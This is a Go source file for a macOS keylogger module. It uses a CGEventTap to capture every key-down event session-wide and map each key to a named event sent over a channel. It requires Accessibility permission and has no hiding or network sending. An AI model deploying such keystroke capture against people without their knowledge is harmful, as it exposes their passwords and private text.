package keylogger

/*
#cgo CFLAGS: -x objective-c
#cgo LDFLAGS: -framework CoreGraphics -framework Carbon

#include <CoreGraphics/CoreGraphics.h>
#include <Carbon/Carbon.h>

extern void goKeyEvent(CGKeyCode keycode, UniChar ch);

static CFMachPortRef globalKeyTap = NULL;

static CGEventRef keyCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
	if (type == kCGEventTapDisabledByTimeout || type == kCGEventTapDisabledByUserInput) {
		if (globalKeyTap) CGEventTapEnable(globalKeyTap, true);
		return event;
	}
	if (type != kCGEventKeyDown) return event;

	CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
	UniChar chars[4] = {0};
	UniCharCount length = 0;
	CGEventKeyboardGetUnicodeString(event, 4, &length, chars);
	goKeyEvent(keycode, length > 0 ? chars[0] : 0);
	return event;
}

// startKeyTap creates the event tap and stores it globally.
// Returns 0 on success, -1 on failure.
static int startKeyTap(void) {
	globalKeyTap = CGEventTapCreate(
		kCGSessionEventTap,
		kCGHeadInsertEventTap,
		kCGEventTapOptionListenOnly,
		CGEventMaskBit(kCGEventKeyDown),
		keyCallback,
		NULL
	);
	return globalKeyTap ? 0 : -1;
}

// runKeyTap adds the global tap to the current thread's run loop and runs it.
// This function blocks forever.
static void runKeyTap(void) {
	if (!globalKeyTap) return;
	CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, globalKeyTap, 0);
	CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);
	CGEventTapEnable(globalKeyTap, true);
	CFRunLoopRun();
	CFRelease(src);
}
*/
import "C"

import "fmt"

// macOS virtual key codes (from Carbon HIToolbox/Events.h).
const (
	kVK_Return        = 0x24
	kVK_Tab           = 0x30
	kVK_Delete        = 0x33 // Backspace on macOS
	kVK_Escape        = 0x35
	kVK_F1            = 0x7A
	kVK_F2            = 0x78
	kVK_F3            = 0x63
	kVK_F4            = 0x76
	kVK_F5            = 0x60
	kVK_F6            = 0x61
	kVK_F7            = 0x62
	kVK_F8            = 0x64
	kVK_F9            = 0x65
	kVK_F10           = 0x6D
	kVK_F11           = 0x67
	kVK_F12           = 0x6F
	kVK_ForwardDelete = 0x75
	kVK_Home          = 0x73
	kVK_End           = 0x77
	kVK_PageUp        = 0x74
	kVK_PageDown      = 0x79
	kVK_LeftArrow     = 0x7B
	kVK_RightArrow    = 0x7C
	kVK_DownArrow     = 0x7D
	kVK_UpArrow       = 0x7E
	kVK_Help          = 0x72
)

var globalKeyEvents chan KeyEvent

//export goKeyEvent
func goKeyEvent(keycode C.CGKeyCode, ch C.UniChar) {
	if globalKeyEvents == nil {
		return
	}
	ev := mapDarwinKey(uint16(keycode), rune(ch))
	if ev.Name != "" || ev.IsReturn || ev.IsBack {
		select {
		case globalKeyEvents <- ev:
		default:
		}
	}
}

type darwinKeyLogger struct {
	events chan KeyEvent
}

// New creates a new KeyLogger for macOS using CGEventTap.
// Requires Accessibility permission in System Settings.
func New() KeyLogger {
	return &darwinKeyLogger{
		events: make(chan KeyEvent, 100),
	}
}

func (k *darwinKeyLogger) Start() error {
	globalKeyEvents = k.events

	if C.startKeyTap() != 0 {
		return fmt.Errorf("failed to create event tap; grant Accessibility permission in System Settings > Privacy & Security > Accessibility")
	}

	go func() {
		C.runKeyTap()
	}()

	return nil
}

func (k *darwinKeyLogger) Events() <-chan KeyEvent {
	return k.events
}

func (k *darwinKeyLogger) Stop() error {
	return nil
}

func mapDarwinKey(keycode uint16, ch rune) KeyEvent {
	switch keycode {
	case kVK_Return:
		return KeyEvent{IsReturn: true}
	case kVK_Delete:
		return KeyEvent{IsBack: true}
	case kVK_Tab:
		return KeyEvent{Name: "[Tab]"}
	case kVK_Escape:
		return KeyEvent{Name: "[Esc]"}
	case kVK_F1:
		return KeyEvent{Name: "[F1]"}
	case kVK_F2:
		return KeyEvent{Name: "[F2]"}
	case kVK_F3:
		return KeyEvent{Name: "[F3]"}
	case kVK_F4:
		return KeyEvent{Name: "[F4]"}
	case kVK_F5:
		return KeyEvent{Name: "[F5]"}
	case kVK_F6:
		return KeyEvent{Name: "[F6]"}
	case kVK_F7:
		return KeyEvent{Name: "[F7]"}
	case kVK_F8:
		return KeyEvent{Name: "[F8]"}
	case kVK_F9:
		return KeyEvent{Name: "[F9]"}
	case kVK_F10:
		return KeyEvent{Name: "[F10]"}
	case kVK_F11:
		return KeyEvent{Name: "[F11]"}
	case kVK_F12:
		return KeyEvent{Name: "[F12]"}
	case kVK_ForwardDelete:
		return KeyEvent{Name: "[Delete]"}
	case kVK_Home:
		return KeyEvent{Name: "[Home]"}
	case kVK_End:
		return KeyEvent{Name: "[End]"}
	case kVK_PageUp:
		return KeyEvent{Name: "[PageUp]"}
	case kVK_PageDown:
		return KeyEvent{Name: "[PageDown]"}
	case kVK_LeftArrow:
		return KeyEvent{Name: "[Left]"}
	case kVK_RightArrow:
		return KeyEvent{Name: "[Right]"}
	case kVK_DownArrow:
		return KeyEvent{Name: "[Down]"}
	case kVK_UpArrow:
		return KeyEvent{Name: "[Up]"}
	case kVK_Help:
		return KeyEvent{Name: "[Help]"}
	}

	// For printable characters, use the unicode character from the event.
	// This naturally handles shift, option, and other modifier combinations.
	if ch > 0 {
		return KeyEvent{Name: string(ch)}
	}

	return KeyEvent{}
}
